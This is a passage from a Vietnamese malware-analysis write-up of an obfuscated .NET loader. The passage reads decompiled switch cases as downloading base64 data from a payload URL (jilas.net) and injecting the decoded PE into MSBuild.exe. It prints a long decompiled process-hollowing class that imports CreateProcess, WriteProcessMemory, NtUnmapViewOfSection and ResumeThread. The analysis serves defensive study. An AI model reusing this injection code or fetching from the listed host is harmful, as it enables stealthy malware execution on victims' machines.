<h4 id="Case-37"><a href="#Case-37" class="headerlink" title="Case 37:"></a>Case 37:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">    \uF181.\uF16F((<span class="built_in">object</span>) webClient, \uF180.\uF16F());</span><br><span class="line">    num1 = <span class="number">63</span>;</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>

<p>Hàm <code>\uF180.\uF16F()</code> tạo ra một đối tượng (có thể là header hoặc cấu hình proxy).</p>
<p>Hàm <code>\uF181.\uF16F</code> có thể là <code>webClient.Headers.Add</code>, thêm header này vào đối tượng webClient.</p>
<h4 id="Case-38"><a href="#Case-38" class="headerlink" title="Case 38:"></a>Case 38:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">    \uF17E.\uF16F((SecurityProtocolType) \uE00E.\uE006(<span class="number">21</span>));</span><br><span class="line">    num1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>

<p>Hàm <code>\uF17E.\uF16F</code> có thể là <code>ServicePointManager.SecurityProtocol</code> dùng để chỉ định giao thức bảo mật.</p>
<p>Tham số <code>(SecurityProtocolType) \uE00E.\uE006(21)</code> có thể trả về giá trị như 3072, tương ứng với <code>SecurityProtocolType.Tls12</code>.</p>
<h4 id="Case-39"><a href="#Case-39" class="headerlink" title="Case 39:"></a>Case 39:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">    str1 = \uF185.\uF16F((<span class="built_in">object</span>) webClient, str3);</span><br><span class="line">    num1 = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>

<p>Hàm <code>\uF185.\uF16F</code> có thể là <code>webClient.DownloadString</code>, tải nội dung từ <code>str3</code> dưới dạng chuỗi.</p>
<p><code>str3</code> có thể là URL đã được giải mã từ các bước trước (như <code>str2</code> trong case 34).</p>
<h4 id="Case-30"><a href="#Case-30" class="headerlink" title="Case 30:"></a>Case 30:</h4><div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">    flag = \uF186.\uF16F(nativo, \uE00D.\uE000(<span class="number">12463</span>));</span><br><span class="line">    num1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> label_1;</span><br></pre></td></tr></table></figure></div>
<p>Kiểm tra biến <code>nativo</code> để quyết định gán giá trị cho <code>flag</code>.</p>
<p><code>flag == true:</code> Có thể xử lý theo hướng “native”.</p>
<p><code>flag == false:</code> Có thể xử lý theo hướng khác (ví dụ: framework).</p>
<p>Có thể hiểu đơn giản là để Xác định xem chương trình có nên thực thi theo một case cụ thể không và dựa vào flag để xác định luồng chương trình.</p>
<p>Vậy ta có thể suy luận ra dựa vào đoạn powershell script gồm các tham số như sau:</p>
<ul>
<li>Đầu tiên nó sẽ lấy url (<a class="link"   target="_blank" rel="noopener" href="http://jilas.net/files/222.txt" >http://jilas.net/files/222.txt<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>). Tải nội dung từ URL mới này bằng webClient.DownloadString và giải mã base64 và lưu dưới dạng byte vào str1.</li>
<li>Sau đó nó kiểm tra <code>nativo</code>. Vì <code>nativo</code> &#x3D; ‘false’, nhánh else được thực thi. Đường dẫn được tạo: <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe (do process_framework = &#39;MSBuild&#39;)</code>.</li>
</ul>
<p>Sau đó nó sẽ gọi<code> Class1.Run</code> với đường dẫn MSBuild.exe và dữ liệu byte của file PE từ str1.</p>
<p>Giờ ta sẽ chuyển qua phân tích <strong>ClassLibrary1.Class1</strong>.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decompiled with JetBrains decompiler</span></span><br><span class="line"><span class="comment">// Type: ClassLibrary1.Class1</span></span><br><span class="line"><span class="comment">// Assembly: ClassLibrary1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span></span><br><span class="line"><span class="comment">// MVID: 45D635A7-ECDB-56EF-9DEB-7ECF0EA12D83</span></span><br><span class="line"><span class="comment">// Assembly location: C:\Users\tamin\Downloads\download (10).exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security;</span><br><span class="line"></span><br><span class="line"><span class="meta">#nullable disable</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ClassLibrary1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Class1</span></span><br><span class="line">  &#123;</span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;CreateProcess&quot;</span>, CharSet = CharSet.Unicode)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE000(</span><br><span class="line">      <span class="built_in">string</span> _param0,</span><br><span class="line">      <span class="built_in">string</span> _param1,</span><br><span class="line">      IntPtr _param2,</span><br><span class="line">      IntPtr _param3,</span><br><span class="line">      <span class="built_in">bool</span> _param4,</span><br><span class="line">      <span class="built_in">uint</span> _param5,</span><br><span class="line">      IntPtr _param6,</span><br><span class="line">      <span class="built_in">string</span> _param7,</span><br><span class="line">      <span class="keyword">ref</span> Class1.\uE001 _param8,</span><br><span class="line">      <span class="keyword">ref</span> Class1.\uE000 _param9);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;GetThreadContext&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE001(IntPtr _param0, <span class="built_in">int</span>[] _param1);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;Wow64GetThreadContext&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE002(IntPtr _param0, <span class="built_in">int</span>[] _param1);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;SetThreadContext&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE003(IntPtr _param0, <span class="built_in">int</span>[] _param1);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;Wow64SetThreadContext&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE004(IntPtr _param0, <span class="built_in">int</span>[] _param1);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;ReadProcessMemory&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE005(</span><br><span class="line">      IntPtr _param0,</span><br><span class="line">      <span class="built_in">int</span> _param1,</span><br><span class="line">      <span class="keyword">ref</span> <span class="built_in">int</span> _param2,</span><br><span class="line">      <span class="built_in">int</span> _param3,</span><br><span class="line">      <span class="keyword">ref</span> <span class="built_in">int</span> _param4);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;WriteProcessMemory&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> \uE006(</span><br><span class="line">      IntPtr _param0,</span><br><span class="line">      <span class="built_in">int</span> _param1,</span><br><span class="line">      <span class="built_in">byte</span>[] _param2,</span><br><span class="line">      <span class="built_in">int</span> _param3,</span><br><span class="line">      <span class="keyword">ref</span> <span class="built_in">int</span> _param4);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;ntdll.dll&quot;</span>, EntryPoint = <span class="string">&quot;NtUnmapViewOfSection&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> \uE007(IntPtr _param0, <span class="built_in">int</span> _param1);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;VirtualAllocEx&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> \uE008(</span><br><span class="line">      IntPtr _param0,</span><br><span class="line">      <span class="built_in">int</span> _param1,</span><br><span class="line">      <span class="built_in">int</span> _param2,</span><br><span class="line">      <span class="built_in">int</span> _param3,</span><br><span class="line">      <span class="built_in">int</span> _param4);</span><br><span class="line"></span><br><span class="line">    [<span class="meta">SuppressUnmanagedCodeSecurity</span>]</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>, EntryPoint = <span class="string">&quot;ResumeThread&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> \uE009(IntPtr _param0);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">Run</span>(<span class="params"><span class="built_in">string</span> path, <span class="built_in">byte</span>[] data</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">int</span> num1 = \uE00E.\uE006(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">-81</span> &gt;= <span class="number">-48</span>)</span><br><span class="line">        <span class="keyword">goto</span> label_21;</span><br><span class="line">label_1:</span><br><span class="line">      <span class="built_in">bool</span> flag1 = Class1.\uE00A(path, <span class="built_in">string</span>.Empty, data, \uE00E.\uE006(<span class="number">0</span>) != <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">-93</span> &lt; <span class="number">-22</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">int</span> num2;</span><br><span class="line">        <span class="keyword">if</span> (!flag1)</span><br><span class="line">          num2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">goto</span> label_20;</span><br><span class="line">label_5:</span><br><span class="line">        <span class="keyword">if</span> (num2 == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">return</span> \uE00E.\uE006(<span class="number">0</span>) != <span class="number">0</span>;</span><br><span class="line">        checked &#123; num1 += \uE00E.\uE006(<span class="number">0</span>); &#125;</span><br><span class="line">        <span class="keyword">goto</span> label_17;</span><br><span class="line">label_20:</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">-4</span> &lt; <span class="number">44</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          num2 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> label_5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">goto</span> label_21;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">goto</span> label_21;</span><br><span class="line">label_8:</span><br><span class="line">      <span class="built_in">int</span> num3;</span><br><span class="line">      num3 ^= \uE00E.\uE006(<span class="number">27</span>);</span><br><span class="line">      <span class="keyword">goto</span> label_12;</span><br><span class="line">label_9:</span><br><span class="line">      <span class="built_in">int</span> num4;</span><br><span class="line">      num4 ^= \uE00E.\uE006(<span class="number">30</span>);</span><br><span class="line">      <span class="keyword">goto</span> label_11;</span><br><span class="line">label_10:</span><br><span class="line">      <span class="built_in">int</span> num5;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ((num5 ^ \uE00E.\uE006(<span class="number">33</span>)) + <span class="number">25</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">goto</span> label_12;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">switch</span> (num4)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_15;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">35</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_17;</span><br><span class="line">              <span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">                <span class="keyword">goto</span> label_8;</span><br><span class="line">              <span class="literal">default</span>:</span><br><span class="line">                num5 = <span class="number">-5</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">goto</span> label_9;</span><br><span class="line">          <span class="literal">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> label_11;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">label_15:</span><br><span class="line">      <span class="built_in">bool</span> flag2;</span><br><span class="line">      <span class="built_in">int</span> num6;</span><br><span class="line">      <span class="keyword">switch</span> (num3 + <span class="number">31</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          flag2 = (num1 &gt; \uE00E.\uE006(<span class="number">1</span>) ? <span class="number">1</span> : <span class="number">0</span>) == \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">          num3 = <span class="number">-7</span>;</span><br><span class="line">          <span class="keyword">goto</span> label_8;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="keyword">if</span> (!flag2)</span><br><span class="line">          &#123;</span><br><span class="line">            num6 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> label_21;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          num3 = <span class="number">-6</span>;</span><br><span class="line">          <span class="keyword">goto</span> label_8;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          num6 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="literal">default</span>:</span><br><span class="line">          num4 = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">goto</span> label_9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (num6 == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_1;</span><br><span class="line">label_11:</span><br><span class="line">      num5 = \uE018.\uE030(<span class="number">29</span>);</span><br><span class="line">      <span class="keyword">goto</span> label_10;</span><br><span class="line">label_12:</span><br><span class="line">      num4 = \uE00E.\uE006(<span class="number">32</span>);</span><br><span class="line">      num5 = <span class="number">-11</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_10;</span><br><span class="line">label_17:</span><br><span class="line">      num3 = \uE018.\uE030(<span class="number">28</span>);</span><br><span class="line">      num4 = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_9;</span><br><span class="line">label_21:</span><br><span class="line">      num3 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> label_8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> \uE00A(<span class="built_in">string</span> _param0, <span class="built_in">string</span> _param1, <span class="built_in">byte</span>[] _param2, <span class="built_in">bool</span> _param3)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">string</span> str = \uF170.\uF16F(\uE00D.\uE000(<span class="number">12461</span>), _param0, \uE00D.\uE000(<span class="number">12461</span>));</span><br><span class="line">      Class1.\uE001 obj1;</span><br><span class="line">      Class1.\uE000 obj2;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">102</span> &gt; <span class="number">61</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        obj1 = <span class="keyword">new</span> Class1.\uE001();</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">33</span> &gt; <span class="number">-29</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          obj2 = <span class="keyword">new</span> Class1.\uE000();</span><br><span class="line">          <span class="keyword">if</span> (<span class="number">77</span> &gt; <span class="number">-68</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            obj1.\uE00B = \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">            <span class="comment">// ISSUE: type reference</span></span><br><span class="line">            obj1.\uE000 = checked ((<span class="built_in">uint</span>) \uF172.\uF16F(\uF171.\uF16F(__typeref (Class1.\uE001))));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">bool</span> flag1;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (((\uF173.\uF16F(_param1) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          str = \uF170.\uF16F(str, \uE00D.\uE000(<span class="number">12384</span>), _param1);</span><br><span class="line">        <span class="keyword">if</span> (((Class1.\uE000(_param0, str, IntPtr.Zero, IntPtr.Zero, \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span>, (<span class="built_in">uint</span>) \uE00E.\uE006(<span class="number">3</span>), IntPtr.Zero, (<span class="built_in">string</span>) <span class="literal">null</span>, <span class="keyword">ref</span> obj1, <span class="keyword">ref</span> obj2) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="built_in">int</span> num1 = \uF175.\uF16F(_param2, \uE00E.\uE006(<span class="number">4</span>));</span><br><span class="line">label_10:</span><br><span class="line">        <span class="built_in">int</span> num2 = \uE00E.\uE006(<span class="number">47</span>);</span><br><span class="line">        <span class="built_in">int</span>[] numArray1;</span><br><span class="line">        <span class="built_in">int</span> num3;</span><br><span class="line">        <span 